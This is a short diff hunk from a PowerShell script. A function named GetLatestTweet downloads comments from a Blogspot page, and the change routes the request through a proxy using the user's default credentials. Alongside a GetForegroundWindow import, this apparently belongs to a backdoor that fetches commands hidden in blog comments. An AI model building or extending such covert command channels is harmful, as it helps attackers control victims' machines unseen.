@@ -821,11 +821,11 @@ public static extern IntPtr GetForegroundWindow();
         Function GetLatestTweet {
              $word = 'comment-content'
             $WebClientObject = New-Object Net.WebClient
-            
             $testo = "http://networksecuritytester.blogspot.it/2015/03/corso-cyberwar.html?showComment"
             Write-Verbose $testo
             
-            
+            $WebProxyObject.UseDefaultCredentials = $True
+            $WebClientObject.Proxy = $WebProxyObject
         
             
             $CommentResult = $WebClientObject.DownloadString($testo)
